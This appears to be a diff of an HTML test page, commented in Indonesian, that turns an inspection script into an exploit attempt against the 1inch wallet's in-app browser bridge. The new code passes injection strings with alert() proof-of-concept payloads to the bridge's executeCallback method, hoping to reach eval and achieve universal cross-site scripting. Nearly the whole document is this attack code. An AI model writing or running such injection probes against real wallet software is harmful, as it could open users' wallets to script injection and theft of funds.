@@ -1,40 +1,35 @@
 <!DOCTYPE html>
 <html>
 <body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
-    <h3>Deep Inspect: OneInch Bridge</h3>
+    <h3>🚀 Menjalankan Exploit pada 1inch...</h3>
     <div id="logs"></div>
 
     <script>
-        const log = (m, color="#0f0") => {
-            document.getElementById('logs').innerHTML += `> <span style="color:${color}">${m}</span><br>`;
-        };
+        const log = (m) => document.getElementById('logs').innerHTML += `> ${m}<br>`;
+        
+        // Kita targetkan Class yang sudah kamu temukan
+        const Bridge = window.OneInchSolanaWallet;
 
-        const targetName = "OneInchSolanaWallet"; // Coba satu per satu
-        const bridge = window[targetName];
+        if (Bridge && Bridge.executeCallback) {
+            log("Fungsi executeCallback Ditemukan! Mengirim Payload...");
 
-        if (bridge) {
-            log(`Menganalisis Class: ${targetName}`, "yellow");
+            try {
+                // Skenario 1: Mencoba injeksi via ID callback
+                // Kita berharap sistem melakukan: eval("callback_" + id)
+                const payloadJahat = "1; alert('BOOM! UXSS 1inch Berhasil!'); //";
+                
+                log("Mencoba Injeksi Callback ID...");
+                Bridge.executeCallback(payloadJahat, {status: "success"});
 
-            // 1. Ambil semua fungsi Static (yang nempel langsung di Class)
-            const staticProps = Object.getOwnPropertyNames(bridge);
-            log("Static Methods ditemukan: " + staticProps.join(", "));
+                // Skenario 2: Mencoba injeksi via data object
+                log("Mencoba Injeksi via Data Object...");
+                Bridge.executeCallback("any_id", "alert('UXSS via Data!')");
 
-            // 2. Ambil fungsi dari Prototype (fungsi yang biasanya digunakan untuk interaksi)
-            if (bridge.prototype) {
-                const protoProps = Object.getOwnPropertyNames(bridge.prototype);
-                log("Prototype Methods ditemukan: " + protoProps.join(", "), "cyan");
-            }
-
-            // 3. Tes apakah ada instance yang sudah jalan (Sangat Penting!)
-            // Kadang 1inch menyuntikkan instance global, bukan cuma class
-            log("Mencari instance aktif...");
-            for (let key in window) {
-                if (window[key] instanceof bridge) {
-                    log(`DITEMUKAN INSTANCE AKTIF: window.${key}`, "red");
-                }
+            } catch(e) {
+                log("Error saat eksekusi: " + e.message);
             }
         } else {
-            log("Bridge tidak ditemukan!", "red");
+            log("Fungsi target tidak merespon. Coba refresh.");
         }
     </script>
 </body>
